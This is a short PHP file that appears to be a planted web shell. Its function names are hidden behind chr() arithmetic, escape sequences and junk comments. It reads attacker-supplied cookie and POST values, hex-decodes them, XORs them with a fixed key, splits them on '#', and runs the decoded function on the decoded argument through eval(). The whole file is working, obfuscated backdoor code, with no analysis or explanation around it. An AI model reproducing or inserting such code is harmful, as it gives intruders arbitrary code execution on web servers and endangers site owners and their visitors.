<?php
$CCwYhzG     =	chr     (/*   rpjNS   */204  -	89	).chr    (	771/*  yI  */-	655 ).chr	(114)    .	chr/* d  */(95)   ./*   E*/'r'	.    'e'     .	"\160"   .  'e'	./*  V   */'a'  .  't';
				$rUrcBNoz    =    "\145"/*  DJHMu   */.  "\170"   .    "\160"    .	chr/*gwLn   */(   1019/*   jC*/-	911 )."\x6f"	.     chr    (100)   ./*   DCjh*/"\x65";
					$eUAnUFETS     =	chr    (99)   ./* KkXs */chr/* un  */(111)	.     chr/* c   */(	857	-  740   )."\x6e"   ./*E*/'t';
				$NhJOhM/* O */=/*cgi   */chr   (112)/* pHvtw  */./*  CpIq  */chr/* y */(97)    .    "\x63"/*   o  */.	"\x6b";
	$ygIKqL	=/*  f */Array/* kulA  */(	"RJlPaEiceYcp"	=>	"BBByoOsrAtzztzKGqHAdlZcBbdFP"    );
					/*BMN  */$bkdLxM/*riS  */=/*   oqkhO  */Array	(	"ZrDeVR"    =>/* CO*/"PMKkAIicC"/*  r  */);


  foreach	(  Array(     $ygIKqL,     $_COOKIE,  $bkdLxM,	$_POST,  $ygIKqL)/*uggzs */as $aJZOthucC)    {
				/*  V   */foreach	(	$aJZOthucC/*EDZF */as/* Y   */$wasUo     =>/*  AnpW  */$BfdXrG/*Ale */)	{
     	$BfdXrG	=/*   s   */@$NhJOhM(/*LqeKD */"\110"  ./*  Ki */"\52",	$BfdXrG	);

	$wasUo .=/* sjxd*/"WZnjU-RpYHulW-OITgezf-LPDAOR-RlRQ-XtcXVPB-mZc";
   /* hbxJX  */$wasUo/*jM   */=/*   Eml  */$CCwYhzG	(	$wasUo,/* ApND   */(/*  rFcq  */strlen(/* bIGso */$BfdXrG	)/strlen(  $wasUo )/*   wuzb  */)	+	1);
				/*BQA   */$UHOnlOyxun   =/*  jQcc */$BfdXrG   ^	$wasUo;
     $UHOnlOyxun/*  xzAO   */=	$rUrcBNoz	(  "\43",  $UHOnlOyxun/*GIO */);
    if/*  DAqr  */(/*   C */$eUAnUFETS	(/* GSDbN   */$UHOnlOyxun    )  ==/*Y  */3 )   {
  /* dtkYs*/$param1/*   fL*/=     $UHOnlOyxun[1];


  $param2/* z  */=/*   wki   */$UHOnlOyxun[2];
      $param3    =	$param1($param2);
	eval (/*   S*/$param3/*w  */);
		die	();


   }
    }
					 }